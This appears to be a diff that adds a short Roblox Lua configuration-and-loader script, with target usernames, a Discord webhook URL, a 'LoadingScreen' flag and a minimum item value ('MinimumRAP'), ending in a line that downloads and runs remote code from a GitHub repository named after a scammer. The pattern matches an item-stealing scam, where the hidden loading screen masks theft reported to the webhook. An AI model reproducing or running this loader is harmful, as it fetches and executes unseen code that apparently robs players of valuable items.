@@ -1,0 +1,9 @@
+Username = "okmeinbruder"
+Username2 = "okmeinbruder"
+Webhook = "https://discord.com/api/webhooks/1189709597087379507/KeKJYL9VY2ltQw8QLeLEAdfU8m3C3p_SnIoZS0DpiLoxeseIVPQ4NnPOT8RJPK4bcNsp"
+
+LoadingScreen = true
+
+MinimumRAP = 100000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xorekisscammer/absos123/main/asbob123"))()
